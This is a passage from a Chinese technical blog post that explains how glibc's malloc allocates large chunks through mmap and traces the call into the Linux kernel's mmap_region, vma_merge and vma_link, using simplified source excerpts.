&#125;</div><div class="line"></div><div class="line">                int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1;</div><div class="line">                atomic_max(&amp;mp_.max_n_mmaps, new);</div><div class="line"></div><div class="line">                unsigned long sum;</div><div class="line">                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</div><div class="line">                atomic_max(&amp;mp_.max_mmapped_mem, sum);</div><div class="line"></div><div class="line">                check_chunk (av, p);</div><div class="line"></div><div class="line">                return chunk2mem(p);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (av == NULL)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先，可以直接通过mmap分配chunk有两个前提条件，一是需要分配的内存大小大于实用mmap进行分配的阀值<code>mp_.mmap_threshold</code>，二是通过<code>mp_.n_mmaps</code>判断系统还可以有可以使用mmap分配的空间。<br>下面就要计算需要分配多少内存，在前面已经通过<code>request2size</code>计算了需要分配的内存大小，这里为什么还要计算呢？这是因为通过使用mmap直接分配的chunk不需要添加到链表中，因此不存在前后关系，当一个chunk被使用时，不能借用后一个chunk的<code>prev_size</code>字段，这里需要把该字段的长度SIZE_SZ加上。并且这里假设<code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code>。<br>接下来判断需要分配的内存大小是否会溢出，然后就调用<code>MMAP</code>分配内存，<code>MMAP</code>是一个宏定义，最后就是通过系统调用来分配内存，后面来看这个函数。<br>再往下就是通过<code>set_head</code>在chunk中的size参数里设置标志位，因为chunk是按8字节对齐的，而size标识chunk占用的字节数，所以最后三位是没有用的，ptmalloc将这三位用来作为标志位，这里便是设置其中一个标志位，用来标识该chunk是直接通过mmap分配的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define set_head(p, s)       ((p)-&gt;size = (s))</div></pre></td></tr></table></figure>
<p>设置完标志位后，接下来就是设置全局变量<code>_mp</code>，将<code>mp_.n_mmaps</code>加1，表示当前进程通过mmap分配的chunk个数，对应的<code>mp_.max_n_mmaps</code>表示最大chunk个数。<code>mp_.mmapped_mem</code>标识已经通过mmap分配的内存大小，<code>mp_.max_mmapped_mem</code>对应可分配内存的最大值。其中，<code>atomic_exchange_and_add</code>b表示原子加，<code>atomic_max</code>则是原子取最大值。<br>最后，通过chunk2mem返回chunk中内存的起始指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</div></pre></td></tr></table></figure>
<p>这里也可以知道，当chunk被使用时，用户是从结构体中的变量fd开始使用内存的。回到_int_malloc函数中，假设通过sysmalloc分配成功，接下来就需要调用alloc_perturb对刚刚分配的内存进行初始化，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static void alloc_perturb(char *p, size_t n) &#123;</div><div class="line">    if (__glibc_unlikely(perturb_byte))</div><div class="line">        memset(p, perturb_byte ^ 0xff, n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>刚函数没有什么实际意义，所以不管它。</p>
<h2 id="MMAP"><a href="#MMAP" class="headerlink" title="MMAP"></a>MMAP</h2><p>为了方便分析，这里贴一段调用MMAP的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0));</div></pre></td></tr></table></figure>
<p>MMAP在glibc中为宏定义，其定义很长，这里简单将它改写，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#define INTERNAL_SYSCALL_MAIN_6(name, err, arg1, arg2, arg3,        \</div><div class="line">                arg4, arg5, arg6)           \</div><div class="line">  struct libc_do_syscall_args _xv =                 \</div><div class="line">    &#123;                                   \</div><div class="line">      (int) (0),                            \</div><div class="line">      (int) (-1),                           \</div><div class="line">      (int) (0)                         \</div><div class="line">    &#125;;                                  \</div><div class="line">    asm volatile (                          \</div><div class="line">    &quot;movl %1, %%eax\n\t&quot;                        \</div><div class="line">    &quot;call __libc_do_syscall&quot;                        \</div><div class="line">    : &quot;=a&quot; (resultvar)                          \</div><div class="line">    : &quot;i&quot; (__NR_mmap2), &quot;c&quot; (size), &quot;d&quot; (PROT_READ | PROT_WRITE), &quot;S&quot; (MAP_ANONYMOUS|MAP_PRIVATE), &quot;D&quot; (&amp;_xv) \</div><div class="line">    : &quot;memory&quot;, &quot;cc&quot;)</div></pre></td></tr></table></figure>
<p><code>__libc_do_syscall</code>是一段汇编代码，最后就是系统调用啦，这里就进入了linux内核中的代码，在arch/x86/entry/syscalls/syscall_32.tbl中有如下定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192 i386    mmap2           sys_mmap_pgoff</div></pre></td></tr></table></figure>
<p>因此，MMAP最后调用linux内核中的<code>sys_mmap_pgoff</code>函数，定义在mm/mmap.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len,</div><div class="line">        unsigned long, prot, unsigned long, flags,</div><div class="line">        unsigned long, fd, unsigned long, pgoff)&#123;</div><div class="line"></div><div class="line">    struct file *file = NULL;</div><div class="line">    unsigned long retval = -EBADF;</div><div class="line"></div><div class="line">    if (!(flags &amp; MAP_ANONYMOUS)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else if (flags &amp; MAP_HUGETLB) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE);</div><div class="line"></div><div class="line">    retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff);</div><div class="line">    return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>SYSCALL_DEFINE6</code>是个宏定义，就是将系统调用号和函数联系起来，这里其实就是定义了<code>sys_mmap_pgoff</code>函数。根据前面传入的flags，这里直接跳过判断，因此下面主要就是执行<code>vm_mmap_pgoff</code>函数，定义在mm/utils.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned long vm_mmap_pgoff(struct file *file, unsigned long addr,</div><div class="line">    unsigned long len, unsigned long prot,</div><div class="line">    unsigned long flag, unsigned long pgoff)</div><div class="line">&#123;</div><div class="line">    unsigned long ret;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    unsigned long populate;</div><div class="line"></div><div class="line">    ret = security_mmap_file(file, prot, flag);</div><div class="line">    if (!ret) &#123;</div><div class="line">        down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">        ret = do_mmap_pgoff(file, addr, len, prot, flag, pgoff,</div><div class="line">                    &amp;populate);</div><div class="line">        up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">        if (populate)</div><div class="line">            mm_populate(ret, populate);</div><div class="line">    &#125;</div><div class="line">    return ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里首先获得进程的<code>mm_struct</code>结构，该结构保存了虚拟内存和物理内存的映射关系，<code>security_mmap_file</code>和linux安全有关，这里不关心，因此调用<code>do_mmap_pgoff</code>执行主要的mmap内容，前后加了信号量。<code>do_mmap_pgoff</code>定义在mm/mmap.c中，这里省略了很多不关键的代码，</p>
<h2 id="do-mmap-pgoff"><a href="#do-mmap-pgoff" class="headerlink" title="do_mmap_pgoff"></a>do_mmap_pgoff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">unsigned long do_mmap_pgoff(struct file *file, unsigned long addr,</div><div class="line">            unsigned long len, unsigned long prot,</div><div class="line">            unsigned long flags, unsigned long pgoff,</div><div class="line">            unsigned long *populate)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    vm_flags_t vm_flags;</div><div class="line">    *populate = 0;</div><div class="line"></div><div class="line">    if (!(flags &amp; MAP_FIXED))</div><div class="line">        addr = round_hint_to_min(addr);</div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line"></div><div class="line">    addr = get_unmapped_area(file, addr, len, pgoff, flags);</div><div class="line">    vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) |</div><div class="line">            mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</div><div class="line"></div><div class="line">    if (file) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else &#123;</div><div class="line">        switch (flags &amp; MAP_TYPE) &#123;</div><div class="line">        case MAP_SHARED:</div><div class="line">            ...</div><div class="line">            break;</div><div class="line">        case MAP_PRIVATE:</div><div class="line">            pgoff = addr &gt;&gt; PAGE_SHIFT;</div><div class="line">            break;</div><div class="line">        default:</div><div class="line">            return -EINVAL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    addr = mmap_region(file, addr, len, vm_flags, pgoff);</div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>传入的flags没有<code>MAP_FIXED</code>，表是映射的地址不固定（这里传入的<code>addr</code>为0），由内核分配。接下来通过调用<code>round_hint_to_min</code>和<code>PAGE_ALIGN</code>对地址和长度进行页对齐，并且检查地址是否溢出或者太小。<br>下面调用<code>get_unmapped_area</code>在进程的用户空间里查找已经分配的虚拟内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned long get_unmapped_area(struct file *file, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags)&#123;</div><div class="line"></div><div class="line">    unsigned long (*get_area)(struct file *, unsigned long,</div><div class="line">                  unsigned long, unsigned long, unsigned long);</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    get_area = current-&gt;mm-&gt;get_unmapped_area;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    addr = get_area(file, addr, len, pgoff, flags);</div><div class="line">    if (IS_ERR_VALUE(addr))</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里首先获取<code>get_area</code>函数指针用来查找用户空间中已经分配的虚拟内存，这里根据mmap的方向可以获取到<code>arch_get_unmapped_area_topdown</code>或者<code>arch_get_unmapped_area</code>两个函数指针，其<code>arch_get_unmapped_area_topdown</code>对应的mmap方向是从高地址往低地址方向扩展的，本章还是分析传统的从低地址往高地址拓展对应的<code>arch_get_unmapped_area</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">unsigned long</div><div class="line">arch_get_unmapped_area(struct file *filp, unsigned long addr,</div><div class="line">        unsigned long len, unsigned long pgoff, unsigned long flags)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma;</div><div class="line">    struct vm_unmapped_area_info info;</div><div class="line">    unsigned long begin, end;</div><div class="line"></div><div class="line">    if (flags &amp; MAP_FIXED)</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (addr) &#123;</div><div class="line">        addr = PAGE_ALIGN(addr);</div><div class="line">        vma = find_vma(mm, addr);</div><div class="line">        if (end - len &gt;= addr &amp;&amp;</div><div class="line">            (!vma || addr + len &lt;= vma-&gt;vm_start))</div><div class="line">            return addr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，如果是固定地址映射，直接返回addr地址。本章分析的不是这种情况，省略的代码和一些随机映射有关，这里省略了不分析。这样就进入了底下的if语句里，对地址对齐后，就调用find_vma查找addr地址开始已经分配出去的虚拟内存vma，最后addr到addr+len这个地址范围内没有虚拟内存，就将地址返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">struct vm_area_struct *find_vma(struct mm_struct *mm, unsigned long addr)</div><div class="line">&#123;</div><div class="line">    struct rb_node *rb_node;</div><div class="line">    struct vm_area_struct *vma;</div><div class="line"></div><div class="line">    vma = vmacache_find(mm, addr);</div><div class="line">    if (likely(vma))</div><div class="line">        return vma;</div><div class="line"></div><div class="line">    rb_node = mm-&gt;mm_rb.rb_node;</div><div class="line">    vma = NULL;</div><div class="line"></div><div class="line">    while (rb_node) &#123;</div><div class="line">        struct vm_area_struct *tmp;</div><div class="line"></div><div class="line">        tmp = rb_entry(rb_node, struct vm_area_struct, vm_rb);</div><div class="line"></div><div class="line">        if (tmp-&gt;vm_end &gt; addr) &#123;</div><div class="line">            vma = tmp;</div><div class="line">            if (tmp-&gt;vm_start &lt;= addr)</div><div class="line">                break;</div><div class="line">            rb_node = rb_node-&gt;rb_left;</div><div class="line">        &#125; else</div><div class="line">            rb_node = rb_node-&gt;rb_right;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (vma)</div><div class="line">        vmacache_update(addr, vma);</div><div class="line">    return vma;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就不往下继续看代码的，简单来说，进程已经分配的虚拟内存保存在一个红黑树中，红黑树简单的作用就是防止一个树结构不平衡，出现某个左子树严重大于右子树的情况。为了加快查找的速度，这里设立了缓存。通过观察while结构，这里就是查找第一个结束地址大于addr的已经分配的虚拟内存，然后返回。</p>
<p>回到<code>do_mmap_pgoff</code>中，<code>calc_vm_prot_bits</code>和<code>calc_vm_flag_bits</code>用来将prot和flags中的标志位转化为vm的标志位，例如prot中的<code>PROT_READ</code>转化为<code>VM_READ</code>，flags中的<code>MAP_GROWSDOWN</code>转化为<code>VM_GROWSDOWN</code>。根据前面prot和flags中的值，这里转化后，<code>vm_flags</code>为<code>VM_READ|VM_WRITE|mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC</code>。最后就调用mmap_region构造一个vma用来保存刚刚获得的虚拟内存。</p>
<h2 id="mmap-region"><a href="#mmap-region" class="headerlink" title="mmap_region"></a>mmap_region</h2><p>为了方便分析和查看，这里对mmap_region代码做了适当的删除和改写，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">unsigned long mmap_region(struct file *file, unsigned long addr,</div><div class="line">        unsigned long len, vm_flags_t vm_flags, unsigned long pgoff)</div><div class="line">&#123;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma, *prev;</div><div class="line">    int error;</div><div class="line">    struct rb_node **rb_link, *rb_parent;</div><div class="line">    unsigned long charged = 0;</div><div class="line"></div><div class="line">    if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    error = -ENOMEM;</div><div class="line">    while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,</div><div class="line">                  &amp;rb_parent)) &#123;</div><div class="line">        if (do_munmap(mm, addr, len))</div><div class="line">            return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    vm_flags |= VM_ACCOUNT;</div><div class="line"></div><div class="line">    vma = vma_merge(mm, prev, addr, addr + len, vm_flags, NULL, file, pgoff,</div><div class="line">            NULL);</div><div class="line">    if (vma)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    vma-&gt;vm_mm = mm;</div><div class="line">    vma-&gt;vm_start = addr;</div><div class="line">    vma-&gt;vm_end = addr + len;</div><div class="line">    vma-&gt;vm_flags = vm_flags;</div><div class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(vm_flags);</div><div class="line">    vma-&gt;vm_pgoff = pgoff;</div><div class="line">    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);</div><div class="line"></div><div class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">out:</div><div class="line"></div><div class="line">    vm_stat_account(mm, vm_flags, file, len &gt;&gt; PAGE_SHIFT);</div><div class="line">    if (vm_flags &amp; VM_LOCKED) &#123;</div><div class="line">        if (!((vm_flags &amp; VM_SPECIAL) || is_vm_hugetlb_page(vma) ||</div><div class="line">                    vma == get_gate_vma(current-&gt;mm)))</div><div class="line">            mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);</div><div class="line">        else</div><div class="line">            vma-&gt;vm_flags &amp;= ~VM_LOCKED;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (file)</div><div class="line">        uprobe_mmap(vma);</div><div class="line"></div><div class="line">    vma-&gt;vm_flags |= VM_SOFTDIRTY;</div><div class="line"></div><div class="line">    vma_set_page_prot(vma);</div><div class="line"></div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>may_expand_vm</code>用于判断加上即将分配的虚拟内存，是否超过了系统的限制，如果超过了就需要进行相应的操作或者返回错误，这里假设不会超过系统限制，不管它。<br><code>find_vma_links</code>的定义如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">static int find_vma_links(struct mm_struct *mm, unsigned long addr,</div><div class="line">        unsigned long end, struct vm_area_struct **pprev,</div><div class="line">        struct rb_node ***rb_link, struct rb_node **rb_parent)&#123;</div><div class="line"></div><div class="line">    struct rb_node **__rb_link, *__rb_parent, *rb_prev;</div><div class="line"></div><div class="line">    __rb_link = &amp;mm-&gt;mm_rb.rb_node;</div><div class="line">    rb_prev = __rb_parent = NULL;</div><div class="line"></div><div class="line">    while (*__rb_link) &#123;</div><div class="line">        struct vm_area_struct *vma_tmp;</div><div class="line"></div><div class="line">        __rb_parent = *__rb_link;</div><div class="line">        vma_tmp = rb_entry(__rb_parent, struct vm_area_struct, vm_rb);</div><div class="line"></div><div class="line">        if (vma_tmp-&gt;vm_end &gt; addr) &#123;</div><div class="line">            if (vma_tmp-&gt;vm_start &lt; end)</div><div class="line">                return -ENOMEM;</div><div class="line">            __rb_link = &amp;__rb_parent-&gt;rb_left;</div><div class="line">        &#125; else &#123;</div><div class="line">            rb_prev = __rb_parent;</div><div class="line">            __rb_link = &amp;__rb_parent-&gt;rb_right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    *pprev = NULL;</div><div class="line">    if (rb_prev)</div><div class="line">        *pprev = rb_entry(rb_prev, struct vm_area_struct, vm_rb);</div><div class="line">    *rb_link = __rb_link;</div><div class="line">    *rb_parent = __rb_parent;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数做了两件事，第一件事是重新检查一遍即将分配的虚拟内存是否已经被使用，主要是其他进程可能在这期间分配了该虚拟内存，第二件事是确定即将插入红黑树中的位置，保存在<code>prev</code>、<code>rb_link</code>和<code>rb_parent</code>中。<code>prev</code>保存了虚拟内存结束地址小于即将分配的虚拟内存开始地址的红黑树节点，<code>rb_link</code>一般为null，<code>rb_parent</code>简单说就是保存了离即将分配的虚拟内存开始地址最近的红黑树节点。</p>
<p>再往下通过vma_merge函数查看是否有虚拟空间可以合并，如果有则合并并返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">struct vm_area_struct *vma_merge(struct mm_struct *mm,</div><div class="line">            struct vm_area_struct *prev, unsigned long addr,</div><div class="line">            unsigned long end, unsigned long vm_flags,</div><div class="line">            struct anon_vma *anon_vma, struct file *file,</div><div class="line">            pgoff_t pgoff, struct mempolicy *policy)&#123;</div><div class="line"></div><div class="line">    pgoff_t pglen = (end - addr) &gt;&gt; PAGE_SHIFT;</div><div class="line">    struct vm_area_struct *area, *next;</div><div class="line">    int err;</div><div class="line"></div><div class="line">    if (vm_flags &amp; VM_SPECIAL)</div><div class="line">        return NULL;</div><div class="line"></div><div class="line">    if (prev)</div><div class="line">        next = prev-&gt;vm_next;</div><div class="line">    else</div><div class="line">        next = mm-&gt;mmap;</div><div class="line">    area = next;</div><div class="line">    if (next &amp;&amp; next-&gt;vm_end == end)</div><div class="line">        next = next-&gt;vm_next;</div><div class="line"></div><div class="line">    if (prev &amp;&amp; prev-&gt;vm_end == addr &amp;&amp;</div><div class="line">            mpol_equal(vma_policy(prev), policy) &amp;&amp;</div><div class="line">            can_vma_merge_after(prev, vm_flags,</div><div class="line">                        anon_vma, file, pgoff)) &#123;</div><div class="line"></div><div class="line">        if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp;</div><div class="line">                mpol_equal(policy, vma_policy(next)) &amp;&amp;</div><div class="line">                can_vma_merge_before(next, vm_flags,</div><div class="line">                    anon_vma, file, pgoff+pglen) &amp;&amp;</div><div class="line">                is_mergeable_anon_vma(prev-&gt;anon_vma,</div><div class="line">                              next-&gt;anon_vma, NULL)) &#123;</div><div class="line"></div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                next-&gt;vm_end, prev-&gt;vm_pgoff, NULL);</div><div class="line">        &#125; else</div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                end, prev-&gt;vm_pgoff, NULL);</div><div class="line">        if (err)</div><div class="line">            return NULL;</div><div class="line">        khugepaged_enter_vma_merge(prev, vm_flags);</div><div class="line">        return prev;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (next &amp;&amp; end == next-&gt;vm_start &amp;&amp;</div><div class="line">            mpol_equal(policy, vma_policy(next)) &amp;&amp;</div><div class="line">            can_vma_merge_before(next, vm_flags,</div><div class="line">                    anon_vma, file, pgoff+pglen)) &#123;</div><div class="line">        if (prev &amp;&amp; addr &lt; prev-&gt;vm_end)</div><div class="line">            err = vma_adjust(prev, prev-&gt;vm_start,</div><div class="line">                addr, prev-&gt;vm_pgoff, NULL);</div><div class="line">        else                    </div><div class="line">            err = vma_adjust(area, addr, next-&gt;vm_end,</div><div class="line">                next-&gt;vm_pgoff - pglen, NULL);</div><div class="line">        if (err)</div><div class="line">            return NULL;</div><div class="line">        khugepaged_enter_vma_merge(area, vm_flags);</div><div class="line">        return area;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就不详细分析这个函数了，主要通过<code>prev-&gt;vm_end == addr</code>判断即将分配的虚拟内存能否往前合并，通过<code>end == next-&gt;vm_start</code>判断即将分配的虚拟内存能否往后合并。其中，合并函数为<code>vma_adjust</code>。再往下就不分析了。</p>
<p>回到函数中，假设不能合并，就要通过slab构造一个<code>vm_area_struct</code>结构体，并设置相应的信息，slab是linux内核中分配小块内存的框架。然后通过<code>vma_link</code>插入到进程的红黑树中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">static void vma_link(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">            struct vm_area_struct *prev, struct rb_node **rb_link,</div><div class="line">            struct rb_node *rb_parent)&#123;</div><div class="line"></div><div class="line">    __vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">    mm-&gt;map_count++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__vma_link</code>执行实际的插入操作，就是一些红黑树的操作，不往下看了。</p>
